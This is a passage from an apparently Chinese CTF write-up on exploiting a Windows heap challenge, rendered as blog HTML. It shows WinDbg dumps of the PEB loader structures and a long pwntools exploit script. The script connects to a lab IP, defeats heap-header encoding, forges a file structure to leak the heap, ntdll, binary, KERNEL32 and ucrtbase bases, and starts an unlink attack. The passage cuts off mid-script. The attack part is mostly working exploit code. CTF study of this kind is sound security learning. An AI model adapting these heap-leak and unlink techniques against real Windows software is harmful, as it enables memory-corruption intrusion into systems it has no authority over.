InMemoryOrderModuleList;</span><br><span class="line">     LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     USHORT LoadCount;</span><br><span class="line">     USHORT TlsIndex;</span><br><span class="line">     <span class="keyword">union</span></span><br><span class="line">     &#123;</span><br><span class="line">         LIST_ENTRY HashLinks;</span><br><span class="line">         <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">         &#123;</span></span><br><span class="line">             PVOID SectionPointer;</span><br><span class="line">             ULONG CheckSum;</span><br><span class="line">         &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="keyword">union</span></span><br><span class="line">     &#123;</span><br><span class="line">         ULONG TimeDateStamp;</span><br><span class="line">         PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     PVOID EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line"> &#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line">PEB_LDR_DATA PebLdr</span><br><span class="line">LdrpInitializeProcess   <span class="comment">//初始化进程时用空项PebLdr创建Ldr</span></span><br><span class="line">    Peb-&gt;Ldr = &amp;PebLdr;</span><br><span class="line">    InitializeListHead(&amp;PebLdr.InLoadOrderModuleList);</span><br><span class="line">    InitializeListHead(&amp;PebLdr.InMemoryOrderModuleList);</span><br><span class="line">    InitializeListHead(&amp;PebLdr.InInitializationOrderModuleList);</span><br><span class="line">    PebLdr.Length = <span class="keyword">sizeof</span>(PEB_LDR_DATA);</span><br><span class="line">    PebLdr.Initialized = TRUE;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _PEB_LDR_DATA</span><br><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   +0x000 Length           : Uint4B</span><br><span class="line">   +0x004 Initialized      : UChar</span><br><span class="line">   +0x008 SsHandle         : Ptr64 Void</span><br><span class="line">   +0x010 InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x020 InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x030 InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +0x040 EntryInProgress  : Ptr64 Void</span><br><span class="line">   +0x048 ShutdownInProgress : UChar</span><br><span class="line">   +0x050 ShutdownThreadId : Ptr64 Void</span><br><span class="line"></span><br><span class="line">0:000&gt; !peb</span><br><span class="line">PEB at 0000000000265000</span><br><span class="line">    InheritedAddressSpace:    No</span><br><span class="line">    ReadImageFileExecOptions: No</span><br><span class="line">    BeingDebugged:            Yes</span><br><span class="line">    ImageBaseAddress:         0000000000400000</span><br><span class="line">    NtGlobalFlag:             0</span><br><span class="line">    NtGlobalFlag2:            0</span><br><span class="line">    Ldr                       00007ffcb0c353c0</span><br><span class="line">    Ldr.Initialized:          Yes</span><br><span class="line">    Ldr.InInitializationOrderModuleList: 00000000008a2800 . 00000000008a6210</span><br><span class="line">    Ldr.InLoadOrderModuleList:           00000000008a2970 . 00000000008a6550</span><br><span class="line">    Ldr.InMemoryOrderModuleList:         00000000008a2980 . 00000000008a6560</span><br><span class="line">												^</span><br><span class="line">0:000&gt; dt _PEB_LDR_DATA 00007ffcb0c353c0</span><br><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   +0x000 Length           : 0x58</span><br><span class="line">   +0x004 Initialized      : 0x1 &apos;&apos;</span><br><span class="line">   +0x008 SsHandle         : (null) </span><br><span class="line">   +0x010 InLoadOrderModuleList : _LIST_ENTRY [ 0x00000000`008a2970 - 0x00000000`008a6550 ]</span><br><span class="line">   +0x020 InMemoryOrderModuleList : _LIST_ENTRY [ 0x00000000`008a2980 - 0x00000000`008a6560 ]</span><br><span class="line">   +0x030 InInitializationOrderModuleList : _LIST_ENTRY [ 0x00000000`008a2800 - 0x00000000`008a6210 ]</span><br><span class="line">   +0x040 EntryInProgress  : (null) </span><br><span class="line">   +0x048 ShutdownInProgress : 0 &apos;&apos;</span><br><span class="line">   +0x050 ShutdownThreadId : (null) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00000000`008a2970 00000000008a27e0 00007ffcb0c353d0</span><br><span class="line">00000000`008a2980 00000000008a27f0 00007ffcb0c353e0</span><br><span class="line">00000000`008a2990 0000000000000000 0000000000000000</span><br><span class="line">00000000`008a29a0 0000000000400000 0000000000401500   &lt;== binbase</span><br></pre></td></tr></table></figure>
<p>其他：</p>
<p>溢出不光可以改<code>Flink&amp;Blink</code>来进行<code>unlink</code>，还可与<code>delete</code>配合，伪造<code>chunk_header</code>进行<code>chunkoverlapping</code>，再进一步利用。</p>
<p><img src="https://i.loli.net/2020/04/04/i4rPdukgyv6fHlc.png" alt="t1.PNG"></p>
<h2 id="myexp："><a href="#myexp：" class="headerlink" title="myexp："></a>myexp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.21.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'ID:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'ID:'</span>)</span><br><span class="line">	p.sendline(str(idx))	</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'ID:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'ID:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_file</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(idx,size,content=None)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'ID:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	<span class="keyword">if</span>(content):</span><br><span class="line">		p.send(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------leak ntdll-------------------------------------</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">		open_file()</span><br><span class="line"></span><br><span class="line">	new(<span class="number">0x88</span>,<span class="number">1</span>)</span><br><span class="line">	new(<span class="number">0x88</span>,<span class="number">2</span>)</span><br><span class="line">	new(<span class="number">0x88</span>,<span class="number">3</span>)</span><br><span class="line">	read_file(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">	show(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">' al'</span>)</span><br><span class="line">	Encoding = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) ^ <span class="number">0x0000000908010009</span></span><br><span class="line">	log.success(<span class="string">'Encoding = '</span>+hex(Encoding))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">'\x11'</span>*<span class="number">0x88</span> + p64(<span class="number">0x0800000913010012</span> ^ Encoding)[:<span class="number">6</span>]</span><br><span class="line">	edit(<span class="number">1</span>,payload)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	new(<span class="number">0x88</span>,<span class="number">4</span>)</span><br><span class="line">	show(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">	heapbase = (u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x10000</span>) &amp; <span class="number">0xffffffffffff0000</span></span><br><span class="line">	<span class="keyword">if</span>(heapbase != <span class="number">0</span>):</span><br><span class="line">		log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.close()</span><br><span class="line">		p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">10000</span>)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line"><span class="comment">#----------------------------------------------------------------------------------</span></span><br><span class="line">	open_file()</span><br><span class="line">	fake_file = p64(<span class="number">0</span>)+p64(<span class="number">0xBEEFDAD0000</span>+<span class="number">0x28</span>+<span class="number">0x20</span>)</span><br><span class="line">	fake_file+= p32(<span class="number">0</span>)+p32(<span class="number">0x2080</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">	fake_file+= p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">	fake_file+= p64(<span class="number">0xffffffffffffffff</span>)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0</span>)</span><br><span class="line">	fake_file+= p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">	edit(<span class="number">3</span>,fake_file)</span><br><span class="line">	read_file(<span class="number">4</span>,<span class="number">8</span>,p64(heapbase+<span class="number">0x2c0</span>))</span><br><span class="line">	show(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">	ntdll = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x0007ffcb0c33cd0</span><span class="number">-0x00007ffcb0ad0000</span>)</span><br><span class="line">	log.success(<span class="string">'ntdll = '</span>+hex(ntdll))</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">PebLdr = ntdll+(<span class="number">0x0007ffcb0c353c0</span><span class="number">-0x0007ffcb0ad0000</span>)</span><br><span class="line">log.success(<span class="string">'PebLdr = '</span>+hex(PebLdr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------------leak other----------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(target,heap_offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	p = remote(ip,port)</span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">				open_file()</span><br><span class="line"></span><br><span class="line">			new(<span class="number">0x88</span>,<span class="number">1</span>)</span><br><span class="line">			new(<span class="number">0x88</span>,<span class="number">2</span>)</span><br><span class="line">			new(<span class="number">0x88</span>,<span class="number">3</span>)</span><br><span class="line">			read_file(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">			show(<span class="number">1</span>)</span><br><span class="line">			p.recvuntil(<span class="string">' al'</span>)</span><br><span class="line">			Encoding = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) ^ <span class="number">0x0000000908010009</span></span><br><span class="line">			<span class="comment">#log.success('Encoding = '+hex(Encoding))</span></span><br><span class="line"></span><br><span class="line">			payload = <span class="string">'\x11'</span>*<span class="number">0x88</span> + p64(<span class="number">0x0800000913010012</span> ^ Encoding)[:<span class="number">6</span>]</span><br><span class="line">			edit(<span class="number">1</span>,payload)</span><br><span class="line">			delete(<span class="number">2</span>)</span><br><span class="line">			new(<span class="number">0x88</span>,<span class="number">4</span>)</span><br><span class="line">			show(<span class="number">3</span>)</span><br><span class="line">			p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">			heapbase = (u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x10000</span>) &amp; <span class="number">0xffffffffffff0000</span></span><br><span class="line">			<span class="comment">#log.success('heapbase = '+hex(heapbase))</span></span><br><span class="line">			<span class="keyword">if</span>(heapbase == <span class="number">0</span>):</span><br><span class="line">				p.close()</span><br><span class="line">				p = remote(ip,port)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">		<span class="comment">#----------------------------------------------------------------------------------</span></span><br><span class="line">			open_file()</span><br><span class="line">			fake_file = p64(<span class="number">0</span>)+p64(<span class="number">0xBEEFDAD0000</span>+<span class="number">0x28</span>+<span class="number">0x20</span>)</span><br><span class="line">			fake_file+= p32(<span class="number">0</span>)+p32(<span class="number">0x2080</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">			fake_file+= p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">			fake_file+= p64(<span class="number">0xffffffffffffffff</span>)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0</span>)</span><br><span class="line">			fake_file+= p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">			edit(<span class="number">3</span>,fake_file)</span><br><span class="line">			<span class="keyword">if</span>(heap_offset == <span class="number">0</span>):</span><br><span class="line">				read_file(<span class="number">4</span>,<span class="number">8</span>,p64(target))</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				read_file(<span class="number">4</span>,<span class="number">8</span>,p64(heapbase+target))</span><br><span class="line">			show(<span class="number">4</span>)</span><br><span class="line">			p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">			result = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">			<span class="keyword">if</span>(result == <span class="keyword">None</span>):</span><br><span class="line">				p.close()</span><br><span class="line">				p = remote(ip,port)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				p.close()</span><br><span class="line">				<span class="keyword">return</span> result</span><br><span class="line">		<span class="keyword">except</span> EOFError:</span><br><span class="line">			p.close()</span><br><span class="line">			p = remote(ip,port)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">			p.close()</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">imoml = leak(PebLdr+<span class="number">0x20</span>)</span><br><span class="line">log.success(<span class="string">'imoml = '</span>+hex(imoml))</span><br><span class="line">imoml_off = imoml &amp; <span class="number">0xffff</span></span><br><span class="line">binbase = leak(imoml_off+<span class="number">0x28</span>,<span class="number">1</span>) - <span class="number">0x1bf0</span></span><br><span class="line">log.success(<span class="string">'binbase = '</span>+hex(binbase))</span><br><span class="line">KERNEL32 = leak(binbase+<span class="number">0x3000</span>)-(<span class="number">0x00007ffcafb79d80</span><span class="number">-0x0007ffcafb60000</span>)</span><br><span class="line">log.success(<span class="string">'KERNEL32 = '</span>+hex(KERNEL32))</span><br><span class="line">ucrtbase = leak(binbase+<span class="number">0x30b0</span>)-(<span class="number">0x00007ffcad87c7b0</span><span class="number">-0x0007ffcad870000</span>)</span><br><span class="line">log.success(<span class="string">'ucrtbase = '</span>+hex(ucrtbase))</span><br><span class="line">pioinfo_ptr = leak(ucrtbase+<span class="number">0xeb750</span>)</span><br><span class="line">log.success(<span class="string">'pioinfo_ptr = '</span>+hex(pioinfo_ptr))</span><br><span class="line">pioinfo_offset = pioinfo_ptr &amp; <span class="number">0xffff</span></span><br><span class="line">log.success(<span class="string">'pioinfo_offset = '</span>+hex(pioinfo_offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------------unlink-----------------------------------------</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ntdll =  0x7ffcb0ad0000</span></span><br><span class="line"><span class="string">PebLdr = 0x7ffcb0c353c0</span></span><br><span class="line"><span class="string">binbase = 0x7ff7427c0000</span></span><br><span class="line"><span class="string">KERNEL32 = 0x7ffcafb60000</span></span><br><span class="line"><span class="string">ucrtbase = 0x7ffcad870000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">			open_file()</span><br><span class="line"></span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">1</span>)</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">2</span>)</span><br><span class="line">		new(<span class="number">0xe8</span>,<span class="number">3</span>)</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">5</span>)</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">6</span>)</span><br><span class="line">		read_file(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">		show(<span 